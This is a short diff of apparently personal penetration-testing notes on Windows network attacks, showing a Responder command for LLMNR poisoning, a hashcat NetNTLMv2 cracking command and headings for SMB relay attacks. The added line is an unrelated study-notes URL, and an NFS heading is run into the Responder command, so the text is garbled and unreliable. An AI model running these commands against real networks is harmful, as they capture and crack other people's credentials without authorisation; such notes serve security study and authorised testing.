@@ -1,6 +1,7 @@
 # LLMNR Poisoning 
 
 sudo responder -I eth0 -dwP 9Using Misconfigured NFS (2049) 
+cliffsnotes.com/study-notes/4507324
 hashcat –m 5600 <hashfile.txt> <wordlist.txt>
 
 # SMB Relay Attacks
